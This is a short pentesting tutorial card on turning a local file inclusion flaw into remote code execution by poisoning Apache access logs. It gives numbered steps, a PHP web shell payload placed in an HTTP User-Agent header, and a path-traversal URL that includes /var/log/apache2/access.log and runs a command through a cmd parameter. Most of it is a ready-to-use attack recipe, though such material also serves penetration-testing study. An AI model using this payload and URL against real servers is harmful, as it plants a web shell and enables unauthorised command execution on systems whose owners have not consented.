Escalating LFI with Log Poisoning

Injecting and executing malicious code via logs.

Key Idea

Log poisoning leverages LFI by injecting malicious PHP code into server logs (e.g., via User-Agent), then including the log file to achieve Remote Code Execution.

Why it Works

Web server log files are often writable by the web server process itself. When included via LFI, the server attempts to parse and execute any code within them.

Pro Tip

Use Burp Suite to easily craft and send HTTP requests with custom User-Agent headers for log poisoning.

Steps for Log Poisoning
  1. Send HTTP request with malicious PHP payload in User-Agent.
  2. Payload gets logged into /var/log/apache2/access.log.
  3. Use LFI to include the poisoned log file.
  4. Execute commands via a cmd parameter.
Malicious User-Agent Payload
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
Host: example.com
Execution URL Example

http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
